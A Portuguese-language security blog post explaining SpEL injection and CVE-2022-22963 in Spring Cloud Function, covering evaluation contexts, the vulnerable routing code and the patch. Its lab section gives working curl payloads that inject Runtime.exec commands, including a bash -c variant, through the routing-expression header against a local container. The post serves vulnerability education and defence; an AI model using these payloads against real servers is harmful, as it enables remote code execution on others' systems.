---
title: "SpEL Injection - Como atacantes tiram vantagem de um erro bobo (seu)"
authors: ["Viktor"]
date: 2026-06-22
summary: "Uma unica linha de código mal escrita pode causar alguns problemas desagradáveis."
tags: ["vuln research", "cve", "exploit"]
draft: false
---

![](https://i.imgur.com/KGEhKr8.png)
Imagine: você está trabalhando em uma aplicação que utiliza Spring Expression Language (SpEL) e, por causa de uma simples linha de texto mal feita, acaba condenando toda a segurança do sistema, dando a possibilidade de um atacante explorar uma vulnerabilidade simples, porém destrutiva.

Neste artigo iremos falar e aprender sobre **SpEL Injection**, uma vulnerabilidade que quando você aprende e entende você percebe o quão facilmente ela pode ser explorada e como uma unica linha de código mal escrita pode causar alguns problemas desagradáveis.

E além de explicar sobre, achei interessante trazer um caso real onde essa vulnerabilidade foi encontrada, no caso iremos utilizar como exemplo a **CVE-2022-22963**, iremos olhar e analisar o código vulnerável e no final iremos reproduzir na pratica a exploração dessa falha rodando um pequeno lab feito para essa CVE, e para quem tiver interesse de testar na própria máquina essa CVE existe o repositório da **vulhub** que disponibiliza o docker compose para esse lab (https://github.com/vulhub/vulhub/tree/master/spring/CVE-2022-22963).

Falando brevemente sobre a **CVE-2022-22963**, ela é uma vulnerabilidade de **RCE** (Remote Code Execution) que afetava as versões 3.1.6, 3.2.2 e algumas outras versões antigas do **VMware Spring Cloud Function**, a vulnerabilidade foi corrigida nas versões 3.1.7 e 3.2.3. Ela é marcada com `Severidade = Critica` e com um `CVSS Score = 9.8`. A vulnerabilidade existia na funcionalidade de **routing** (vamos ver mais para frente), que permitia um atacante passar um expressão SpEL maliciosa como uma **routing-expression** que ocasionava RCE.

Feita essa apresentação podemos começar a nos perguntar o que diabos é **Spring Expression Language**?

# 1. Spring Expression Language

## 1.1. O que é SpEL?

Spring Expression Language é uma linguagem de expressão integrada ao **Spring Framework**. Ela permite consultar e manipular grafos de objetos em tempo de execução como propriedades, chamar métodos, fazer operações matemáticas e lógicas.

Alguns exemplos:

```java
// 1. Literal
System.out.println(p.parseExpression("'Hello World'").getValue(ctx));

// 2. Operacao matematica
System.out.println(p.parseExpression("2 * 2 * 2").getValue(ctx));

// 3. Ternario
System.out.println(p.parseExpression("10 > 5 ? 'maior' : 'menor'").getValue(ctx));

// 4. Metodo em string
System.out.println(p.parseExpression("'java'.length()").getValue(ctx));
```

Existem dois componentes principais que compõem o funcionamento do SpEL: O **Parser**(`SpelExpressionParser`) e o **Contexto**(`EvaluationContext`).

1. **SpelExpressionParser:** Recebe a string e a transforma em uma árvore de expressão (AST).

2. **EvaluationContext:** Decide o que pode ser acessado quando a árvore for avaliada.

## 1.2. Como funciona o Parser e Evaluation Context

A primeira vez que eu estava lendo sobre isso, fiquei um bom tempo tentando entender essa parte, por isso vou tentar facilitar a explicação até porque aqui que mora a base necessária para entender a vulnerabilidade.

Primeiro vamos utilizar como exemplo básico a expressão: `10 * 2 + 5` 

```java
import org.springframework.expression.spel.standard.SpelExpressionParser;
import org.springframework.expression.spel.support.StandardEvaluationContext;

class Basic {
    public static void main(String[] args) {
        var p = new SpelExpressionParser();
        var ctx = new StandardEvaluationContext();
        
        System.out.println(p.parseExpression("10 * 2 + 5").getValue(ctx));
        
    }
}
```
Linha 9:
```java
System.out.println(p.parseExpression("10 * 2 + 5").getValue(ctx));
```

Quando passamos essa expressão com o **`p.parseExpression("10 * 2 + 5")`**, o parser começa a "ler" a string e dependendo do que foi passado na string ele vai montando a árvore em tempo real e a própria estrutura da string dita qual nó vai ser criado e onde vai ser criado. Nesse exemplo ao encontrar operadores matemáticos o parser gera nós de operações:

10 * 2 + 5

\* -> **OpMultiply** = Nó 1
\+ -> **OpPlus** = Nó 2

**10 OpMultiply 2 OpPlus 5** = ???

Após montar toda a árvore entra a vez do **EvaluationContext** no **`getValue(ctx)`**, que vai caminhar toda a árvore resolvendo cada um dos nós e o resultado de um alimenta o outro:

**10 OpMultiply 2** = 20
**20 OpPlus 5** = 25 <--- Resposta

No exemplo anterior foi utilizado expressões matemáticas, agora vamos utilizar expressões mais "complexas" com cadeia de chamadas como **`a.b().c()`**. Por exemplo:

```java
p.parseExpression("T(java.lang.Runtime).getRuntime().exec('touch /tmp/ilovecats')")
```

Quando o parser começar a ler a string acima, ele vai reconhecer o encadeamento e vai utilizar um nó especifico para isso, chamado de **CompoundExpression**.

O **CompoundExpression** não aninha os nós, ele guarda os pedaços numa lista em ordem e avalia da esquerda para a direita e cada um operando sobre o resultado que o anterior entregou.

Como a avaliação é sequencial e a resolução de um nó depende do anterior, basta o primeiro nó falhar para a cadeia inteira parar.

No exemplo acima a CompoundExpression ficaria assim:

```
T(java.lang.Runtime).getRuntime().exec('touch /tmp/ilovecats')"

(1º Nó) - T(java.lang.Runtime)         ---> TypeReference
(2º Nó) - getRuntime()                 ---> MethodReference
(3º Nó) - exec('touch /tmp/ilovecats') ---> MethodReference
```

1. O **T(java.lang.Runtime)** é resolvido e vira um **Class**
2. Esse **Class** é entregue para o **getRuntime()** e ele devolve um **Runtime**
3. O **Runtime** é entregue para o **exec(...)**
4. E para finalizar o **exec()** vai executar **touch /tmp/ilovecats**

Feita essa explicação ainda existe uma outra questão: existem dois tipos de **EvaluationContext**, no exemplo acima foi utilizado o **StandardEvaluationContext**:

```java 
var ctx = new StandardEvaluationContext();
```

Mas existem dois, a diferença é que: um deles confia 100% no que esta sendo passado na expressão executando tudo sem questionar. Já o outro vem "capado" de propósito: operações como referência de tipo, construtor e bean simplesmente não têm como ser resolvidas nele, então quando o avaliador esbarra numa dessas, ele para.

## 1.3. StandardEvaluationContext vs SimpleEvaluationContext

Como dito na seção anterior existem dois tipos de **EvaluationContext**, esses dois tipos são: **StandardEvaluationContext** e o **SimpleEvaluationContext** e entender como cada um deles tratam e validam o dado que esta sendo passado é chave para entender esse tipo de vulnerabilidade, pois o uso inadequado desses dois pode ser o motivo do porque um atacante conseguiu RCE em alguma aplicação.

Começando com o **SimpleEvaluationContext**. 

Vejamos o seguinte código de exemplo:

```java
import org.springframework.expression.spel.standard.SpelExpressionParser;
import org.springframework.expression.spel.support.SimpleEvaluationContext;

class Simple {

    public static void main(String[] args) {
        var p = new SpelExpressionParser();
        var ctx = SimpleEvaluationContext.forReadOnlyDataBinding().build();

        // Parser: a string vira a árvore AST normalmente, até aqui sem problemas.
        var exp = p.parseExpression(
            "T(java.lang.Runtime).getRuntime().exec('touch /tmp/nsafiles')"
        );

        // Confirma que a AST foi montada antes de qualquer avaliação
        System.out.println("AST montada: " + exp.getExpressionString());

        try {
            // Agora o getValue caminha a AST. O SimpleEvaluationContext não tem
            // como resolver T(...), então ao bater nesse nó ele lança a exceção.
            exp.getValue(ctx);
        } catch (Exception e) {
            System.out.println("BLOQUEADO: " + e.getMessage());
        }
    }
}

```

Nas linhas 7-8:
```java
var p = new SpelExpressionParser();
var ctx = SimpleEvaluationContext.forReadOnlyDataBinding().build();
```

Criamos a nossa variável **p** que vai ser o nosso parser, e criamos a variável **ctx** que vai ser o contexto de avaliação.

Neste exemplo estamos usando o **SimpleEvaluationContext**, ele é o contexto "capado" que havia sido citado mais cedo no texto nele é necessário que a gente escolha explicitamente o nível de acesso do contexto, nesse caso estamos usando o `forReadOnlyDataBinding()`, que libera apenas a **leitura** de propriedades — ele lê, mas não escreve nem altera nada.

```java
var exp = p.parseExpression(
            "T(java.lang.Runtime).getRuntime().exec('touch /tmp/nsafiles')"
        );
```

O **parser** monta a árvore normalmente

```java
try {
    exp.getValue(ctx);
    } catch (Exception e) {
        System.out.println("BLOQUEADO: " + e.getMessage());
}
```

E aqui o contexto tenta resolver a árvore que foi criada anteriormente, se caso em algum momento ele falhar, uma mensagem de erro vai ser exibida.

Se rodarmos esse código veremos o seguinte resultado:
(***Na imagem ta rodando um arquivo .sh, mas é so um script de compilação do código java***)

![](https://i.imgur.com/LW3nCtK.png)

Podemos observar que a árvore AST foi montada normalmente sem problemas, mas quando chegou na parte do (`exp.getValue(ctx)`) a execução foi bloqueada, e a própria mensagem de erro indica para nós o porque: **Type cannot be found 'java.lang.Runtime'**, ou seja o **SimpleEvaluationContext** não consegue concluir a execução porque ele não tem como resolver referencia de tipo nenhuma, e isso se deve porque o **SimpleEvaluationContext** não tem um **TypeLocator**, que é utilizado para localizar classes apenas pelo nome, então o avaliador até caminha a árvore nó por nó, mas no momento em que precisa resolver um `T(...)`, um `new` ou um `@bean` por exemplo, ele não encontra a ferramenta pra isso.

Podemos até realizar outro teste, testando com uma classe completamente inofensiva para verificar se irá acontecer a mesma coisa.

Utilizando o mesmo código acima como base:

```java
// Trocamos a linha
var exp = p.parseExpression("T(java.lang.Runtime).getRuntime().exec('touch /tmp/nsafiles')");

// Por:
var exp = p.parseExpression("T(java.lang.String).getRuntime().exec('touch /tmp/nsafiles')");

// Ou seja, apenas trocamos "Runtime" -> "String"
```

Feito isso podemos rodar o código novamente:

![](https://i.imgur.com/Prwat8M.png)

E podemos ver que mesmo utilizando uma classe completamente inofensiva ainda sim obtemos um erro **Type cannot be found 'java.lang.String'**, ou seja independente da classe que for, o **SimpleEvaluationContext** não consegue resolver referencia de tipo nenhuma.

Antes de continuarmos, uma coisa interessante a se notar sobre esse ultimo teste. Na classe **String** não existe um método **getRuntime()**, então deveria ter dado um erro relacionado essa método que não existe, certo? A resposta é sim, mas como foi dito mais cedo, se passarmos ***"T(java.lang.String).getRuntime().exec('touch /tmp/nsafiles')"*** como string o parser vai identificar o encadeamento e vai utilizar o **CompoundExpression** e como a avaliação da string é sequencial se caso um nó falhar, o restante da cadeia irá parar também. Ou seja o quando o contexto vai tentar resolver **T(java.lang.String)** ele não consegue e já falha e nem tenta resolver o restante da string, por isso a mensagem de erro é referente a classe e não ao método **getRuntime()**.

Beleza, legal e bacana. Mas agora: Se o **SimpleEvaluationContext** é o contexto "capado" o **StandardEvaluationContext** é o contexto que libera tudo? A resposta é: Não libera tudo literalmente, mas libera tudo aquilo que o Simple não deixava. 

O **StandardEvaluationContext** é completamente o oposto ao Simple, ele tem as ferramentas que o Simple não tem como por exemplo o **TypeLocator**, com isso consegue resolver `T(...)`, resolver de construtor (resolve `new`), e acesso reflexivo a métodos e propriedades. 

Vejamos o codigo a seguir bem parecido com o do outro exemplo:

```java
import org.springframework.expression.spel.standard.SpelExpressionParser;
import org.springframework.expression.spel.support.StandardEvaluationContext;

class Standard {

    public static void main(String[] args) {
        var p = new SpelExpressionParser();
        var ctx = new StandardEvaluationContext();

        // Parser: a string vira a árvore AST — exatamente a mesma etapa do exemplo do Simple.
        var exp = p.parseExpression(
            "T(java.lang.Runtime).getRuntime().exec('touch /tmp/spaceman')"
        );

        // Confirma que a AST foi montada antes de qualquer avaliação
        System.out.println("AST montada: " + exp.getExpressionString());

        // Agora o getValue caminha a AST. O StandardEvaluationContext resolve T(...),
        // chama getRuntime() e exec() — a cadeia inteira roda e vira RCE.
        exp.getValue(ctx);

        System.out.println("RCE: /tmp/spaceman criado");
    }
}

```

Linha 8:
```java
var ctx = new StandardEvaluationContext();
```

Usamos o **StandardEvaluationContext** e diferente do Simple que obriga o builder (`forReadOnlyDataBinding().build()`) o Standard tem construtor público, então dá pra instanciar o contexto direto com `new StandardEvaluationContext()`.

```java
exp.getValue(ctx);

System.out.println("RCE: /tmp/spaceman criado");
```

O Contexto vai resolver a árvore nó por nó e se der tudo certo, vai imprimir uma mensagem no final.

Ao rodarmos esse codigo:

![](https://i.imgur.com/TEXi0Qf.png)

Podemos ver que deu certo. A árvore foi criada normalmente e o contexto resolveu todos os nós normalmente e no final executou **touch /tmp/spaceman**.

Outro teste que podemos fazer novamente e que foi feito no exemplo do Simple é:

```java
// Trocar a linha
var exp = p.parseExpression("T(java.lang.Runtime).getRuntime().exec('touch /tmp/spaceman')");

// Por:
var exp = p.parseExpression("T(java.lang.String).getRuntime().exec('touch /tmp/ilovedogstoo')");
```

Quando rodamos o codigo:

![](https://i.imgur.com/ACkvczd.png)

Vemos que a árvore foi montada normalmente, so que ele deu um erro para a gente

```
Method call: Method getRuntime() cannot be found on type java.lang.String
```

Ou seja, o contexto resolveu o primeiro nó (**T(java.lang.String)**) so que quando chegou no segundo nó (**getRuntime()**) o contexto foi resolver esse método mas viu que ele não existe na classe String e parou o a execução.
## 1.4. SpEL Injection

Após toda essa explicação, que eu espero que tenha ficado boa o suficiente para que você caro leitor tenha entendido sem nenhum problema, podemos falar sobre **SpEL Injection**. Pode ser que depois de ler toda essa explicação acima, você tenha imaginado do que essa vulnerabilidade se trata, e o porque no titulo do artigo esteja escrito "... tirar vantagem de um erro bobo **(seu)**", mas simplificando:

A vulnerabilidade acontece quando uma aplicação pega uma entrada que o **usuário controla** e usa ela como uma expressão SpEL pra ser avaliada — e ainda por cima avalia com o contexto poderoso, o **StandardEvaluationContext**.
# 2. Onde começa a brincadeira? CVE-2022-22963

Muita explicação até o momento, vamos ver um exemplo disso na pratica utilizando a **CVE-2022-22963**.
## 2.1. RoutingFunction.java - onde tudo acontece

Como foi dito lá na introdução do artigo essa vulnerabilidade existia na funcionalidade de **routing**. o arquivo **RoutingFunction.java** abriga a função **RoutingFunction** que é o coração do bug. Vamos olhar as linhas mais importantes.

Se caso vocês quiserem ver o codigo vulnerável completo e ir acompanhando: https://github.com/spring-cloud/spring-cloud-function/blob/v3.2.2/spring-cloud-function-context/src/main/java/org/springframework/cloud/function/context/config/RoutingFunction.java

Primeiro, os imports:

```java
import org.springframework.expression.spel.standard.SpelExpressionParser;    // linha 36
import org.springframework.expression.spel.support.StandardEvaluationContext; // linha 37
```

Se você leu a sessão 1, provavelmente sabe o que esses dois fazem. O parser monta a árvore, o contexto decide se vai executar. Nesse caso esta sendo importado o **StandardEvaluationContext**, isso já é algo que pode chamar nossa atenção.

```java
public static final String FUNCTION_NAME = "functionRouter";                  // linha 57
```

Aqui ele define o nome público dessa função: `functionRouter`.

```java
private final StandardEvaluationContext evalContext = new StandardEvaluationContext(); // linha 61
```

Aqui mora o **root cause** da vulnerabilidade. O contexto é instanciado como `StandardEvaluationContext` e como vimos nas explicações acima esse é o contexto que resolve `T(...)`, `new`, `@bean` e qualquer método. 

```java
private final SpelExpressionParser spelParser = new SpelExpressionParser();  // linha 63
```

Aqui como sabemos o Parser não faz nada de perigoso, apenas transforma a string em árvore.

Agora, a linha que conecta o input do atacante ao código vulnerável:

```java
function = this.functionFromExpression(
    (String) message.getHeaders().get("spring.cloud.function.routing-expression"), // linha 127
    message
);
```

Aqui vemos que o ele pega o valor do header `spring.cloud.function.routing-expression` direto da requisição HTTP e joga direto como argumento para o método `functionFromExpression`, sem validação nenhuma.

E para finalizar, dentro do método `functionFromExpression` temos:

```java
Expression expression = spelParser.parseExpression(routingExpression);  // linha 195
String functionName = expression.getValue(this.evalContext, input, String.class);
```

1. `parseExpression(routingExpression)` - o parser monta a árvore a partir da string do atacante no header (mesmo assim aqui ainda não tem nenhum perigo)
2. `getValue(this.evalContext, ...)` - agora sim, o contexto executa a árvore que foi criada anteriormente usando o `StandardEvaluationContext`

Se a string do atacante for `T(java.lang.Runtime).getRuntime().exec("id")`, o parser vai montar a árvore e por conta do `StandardEvaluationContext` o contexto vai resolver tudo e vai executar o comando.
## 2.2. So acredito testando

Como eu havia dito na introdução, podemos utilizar um pequeno lab que esta disponível no repositorio da vulhub para podermos testar essa vulnerabilidade.

Subimos o container: 

![](https://i.imgur.com/dI6wzze.png)

Podemos rodar o seguinte Curl para testar se esta tudo ok: 

```
curl http://localhost:8080/uppercase -H "Content-Type: text/plain" --data-binary test
```

Se estiver tudo ok, podemos começar a testar.

Podemos rodar um payload básico utilizando o curl:

```bash
curl -X POST http://localhost:8080/functionRouter \
  -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("touch /tmp/pwned")' \
  -H 'Content-Type: text/plain' \
  -d 'test'
```

![](https://i.imgur.com/Az1eCod.png)

Podemos ver que recebemos um erro HTTP com codigo **500**, e isso é esperado não tem problema nenhum.

Podemos confirmar se o arquivo foi criado realmente utilizando:

```bash
docker exec env-spring-1 ls -la /tmp/pwned
```

![](https://i.imgur.com/BseqqvO.png)

Podemos ver que o comando foi executado e o arquivo foi realmente criado.

Legal, mas e se a gente tentar executar por exemplo o comando **whoami**?

Como a requisição sempre vai retornar um codigo 500 para a gente, rodar comandos diretos assim pode até funcionar por baixo dos panos, mas a reposta não vai ser apresentada para nós. Para contornar isso podemos fazer com que a reposta do comando seja salva em um arquivo, e depois podemos utilizar o cat para ler o arquivo que vai conter a informação.

Vamos tentar redirecionar a saída do `whoami` pra um arquivo e depois ler:

```bash
curl -X POST http://localhost:8080/functionRouter \
  -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("bash -c \"whoami > /tmp/output.txt\"")' \
  -H 'Content-Type: text/plain' \
  -d 'espero que de certo'
```

Mesmo 500 de sempre. Vamos conferir o arquivo:

```bash
docker exec env-spring-1 cat /tmp/output.txt
```

![](https://i.imgur.com/zIxrItB.png)

Ué... Não rodou?

`Runtime.exec(String)` **não invoca um shell**. Ele faz um split tosco por espaços, sem entender aspas, sem entender pipes, sem nada, ou seja o  comando que a gente passou:

```
bash -c "whoami > /tmp/output.txt"
```

Vira esses tokens bizarros:

```
["bash", "-c", "\"whoami", ">", "/tmp/output.txt\""]
```

O `bash -c` recebe `"whoami` como comando (com aspas no meio), não sabe o que fazer com isso, e falha silenciosamente. É por isso que nada acontece.

Para solucionar isso podemos utilizar **`Runtime.exec(String[])`**, ele aceita um **array** de strings, onde cada elemento é um argumento separado, com isso conseguimos controlar exatamente o que cada parte significa.

```
T(java.lang.Runtime).getRuntime().exec(new String[]{"bash","-c","whoami > /tmp/output.txt"})'

new String[]{"bash","-c","whoami > /tmp/output.txt"}"

"bash","-c","whoami > /tmp/output.txt
```

A diferença é `new String[]{"bash","-c","whoami > /tmp/output.txt"}`. Cada string do array vira um argumento exato. Agora o `bash -c` recebe o comando completo como um bloco só, o shell de verdade é invocado, e o redirect funciona.

Sabendo disso podemos tentar novamente mas agora da forma correta:

```bash
curl -X POST http://localhost:8080/functionRouter \
  -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(new String[]{"bash","-c","whoami > /tmp/output.txt"})' \
  -H 'Content-Type: text/plain' \
  -d 'pelo amor de Deus, funciona...'
```

![](https://i.imgur.com/DFZpjxd.png)

Ok, bacana recebemos codigo 500. Agora vamos verificar se o arquivo foi criado.

![](https://i.imgur.com/f6yMTIq.png)

BANGER. Conseguimos, temos output visível.

Aqui testando um exemplos simples, se você tiver interesse você pode brincar mais, por aqui isso é que temos para hoje.
## 2.3. O patch 

https://github.com/spring-cloud/spring-cloud-function/commit/0e89ee27b2e76138c16bcba6f4bca906c4f3744f

Nesse caso o problema nunca foi o `T(...)` em si, foi o `T(...)` vindo de uma entrada que o **atacante** consegue controlar, nesse caso o HTTP. A correção separa as duas origens. Eles mantiveram o `StandardEvaluationContext` pro caminho confiável e adicionaram um `SimpleEvaluationContext` novo só pro caminho do header:

```java
// continua existindo, pro caminho confiável (config/property)
private final StandardEvaluationContext evalContext = new StandardEvaluationContext();

// NOVO: contexto restrito, só pro caminho do header (controlável pelo atacante)
private final SimpleEvaluationContext headerEvalContext = SimpleEvaluationContext.forReadOnlyDataBinding().build();
```

E, na hora de avaliar, um flag `isViaHeader` decide qual contexto usar:

```java
String functionName = isViaHeader
    ? expression.getValue(this.headerEvalContext, input, String.class)  // veio do header -> Simple (capado)
    : expression.getValue(this.evalContext,       input, String.class); // veio de config -> Standard (poderoso)
```

Quando a expressão vem do header `spring.cloud.function.routing-expression` (o vetor do atacante), o `isViaHeader` é `true` e a avaliação cai no `headerEvalContext`. Sem `TypeLocator`, o `T(java.lang.Runtime)` morre no primeiro nó.

https://www.sentinelone.com/vulnerability-database/cve-2022-22963/
https://docs.spring.io/spring-framework/docs/3.0.x/reference/expressions.html
https://docs.spring.io/spring-framework/docs/6.0.0/javadoc-api/org/springframework/expression/spel/support/SimpleEvaluationContext.html
https://docs.spring.io/spring-framework/reference/core/expressions/evaluation.html
https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/expression/spel/support/StandardEvaluationContext.html
https://nvd.nist.gov/vuln/detail/CVE-2022-22963
